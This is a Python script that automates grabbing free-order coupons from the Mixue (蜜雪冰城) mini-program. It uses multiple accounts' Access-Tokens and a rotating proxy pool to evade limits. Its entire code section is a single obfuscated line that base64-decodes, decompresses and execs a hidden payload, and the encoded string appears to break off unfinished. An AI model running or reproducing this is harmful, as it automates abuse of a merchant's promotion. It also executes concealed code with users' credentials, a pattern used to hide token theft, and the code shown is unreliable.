#   --------------------------------注释区--------------------------------
#   入口:蜜雪冰城小程序
#   变量: yuanshen_mxbq_aw 填口令
#         yuanshen_mxbqqg填Access-Token 多号分割方式 [ 新建同名变量 ]
#         yuanshen_mxbqqg_aid填marketingId 可以提前抓好 好像一天一变
#         yuanshen_mxbq_poxieurl 填代理api 要求返回txt格式 一次性返回30条及以上（越多越号） 多条需要换行分割 号少请使用无代理版本
#   在需要抢免单的整点前运行 如要抢19点的则需在18:01-18:59内运行 然后等待脚本自动运行
thread_m = 1 #并发线程数 推荐1-3 指的是每个号并发的线程 而不是总线程并发上线 不懂默认
#   目前逻辑是在抢购前10秒提前请求api获取代理ip列表，理论上返回的代理够多不怎么会影响抢购速度，只有每次代理用完了重新去获取才会产生延迟
#   --------------------------------一般不动区--------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
# 
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#   --------------------------------代码区--------------------------------
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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
